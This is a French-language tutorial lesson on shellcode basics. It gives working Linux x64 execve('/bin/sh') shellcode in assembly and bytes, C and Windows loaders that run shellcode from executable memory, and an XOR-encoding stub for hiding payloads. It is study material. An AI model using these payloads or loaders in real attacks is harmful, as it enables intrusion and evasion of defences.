# Cours 01 : Shellcode Basics

## Qu'est-ce qu'un Shellcode ?

Un **shellcode** est une séquence de bytes représentant du code machine, généralement conçu pour être injecté et exécuté dans la mémoire d'un processus.

## Contraintes du Shellcode

```
┌─────────────────────────────────────────────────────────────────┐
│  CONTRAINTES COURANTES                                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  • Pas de NULL bytes (0x00) - termine les chaînes              │
│  • Position-independant - pas d'adresses absolues              │
│  • Compact - taille limitée du buffer                          │
│  • Auto-contenu - pas de dépendances externes                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Shellcode Linux x64 : execve("/bin/sh")

```nasm
; shellcode_execve.asm
; nasm -f elf64 shellcode.asm && ld shellcode.o -o shellcode

section .text
global _start

_start:
    xor rax, rax        ; RAX = 0 (évite NULL bytes)
    push rax            ; NULL terminator
    mov rdi, 0x68732f6e69622f2f  ; "//bin/sh" (inversé)
    push rdi
    mov rdi, rsp        ; RDI = pointeur vers "/bin/sh"
    push rax            ; NULL pour argv
    push rdi            ; argv[0] = "/bin/sh"
    mov rsi, rsp        ; RSI = argv
    xor rdx, rdx        ; RDX = NULL (envp)
    mov al, 59          ; syscall execve (59)
    syscall
```

## Extraction des Bytes

```bash
# Assembler
nasm -f elf64 shellcode.asm -o shellcode.o

# Linker
ld shellcode.o -o shellcode

# Extraire les bytes
objcopy -O binary -j .text shellcode shellcode.bin

# Afficher en format C
xxd -i shellcode.bin
```

## Exécuter un Shellcode en C

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// Shellcode execve("/bin/sh") - Linux x64
unsigned char shellcode[] =
    "\x48\x31\xc0"                 // xor rax, rax
    "\x50"                         // push rax
    "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68" // mov rdi, "//bin/sh"
    "\x57"                         // push rdi
    "\x48\x89\xe7"                 // mov rdi, rsp
    "\x50"                         // push rax
    "\x57"                         // push rdi
    "\x48\x89\xe6"                 // mov rsi, rsp
    "\x48\x31\xd2"                 // xor rdx, rdx
    "\xb0\x3b"                     // mov al, 59
    "\x0f\x05";                    // syscall

int main(void) {
    // Allouer mémoire exécutable
    void *exec = mmap(
        NULL,
        sizeof(shellcode),
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_ANONYMOUS | MAP_PRIVATE,
        -1, 0
    );

    // Copier le shellcode
    memcpy(exec, shellcode, sizeof(shellcode));

    // Exécuter
    ((void(*)())exec)();

    return 0;
}
```

## Shellcode Windows : MessageBox

```c
// Shellcode qui affiche une MessageBox
// Nécessite de résoudre dynamiquement les adresses

unsigned char shellcode[] =
    // ... code pour trouver kernel32.dll
    // ... code pour trouver GetProcAddress
    // ... code pour trouver LoadLibraryA
    // ... code pour charger user32.dll
    // ... code pour appeler MessageBoxA
    "";
```

## Techniques d'Obfuscation

```c
// XOR encoding
void xor_decode(unsigned char *shellcode, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        shellcode[i] ^= key;
    }
}

// Shellcode XORé avec 0x41
unsigned char encoded[] = "\x09\x70\x81...";
xor_decode(encoded, sizeof(encoded) - 1, 0x41);
// Exécuter le shellcode décodé
```

## Exécution Windows

```c
#include <windows.h>

unsigned char shellcode[] = "...";

int main(void) {
    // Allouer mémoire RWX
    LPVOID exec = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // Copier
    memcpy(exec, shellcode, sizeof(shellcode));

    // Exécuter
    ((void(*)())exec)();

    return 0;
}
```

## Résumé

```
┌─────────────────────────────────────────────────────────────────┐
│  ÉTAPES DE CRÉATION D'UN SHELLCODE                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Écrire le code en assembleur                               │
│  2. Assembler et extraire les bytes                            │
│  3. Vérifier l'absence de NULL bytes                           │
│  4. Tester dans un harness                                      │
│  5. Encoder si nécessaire (XOR, etc.)                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```
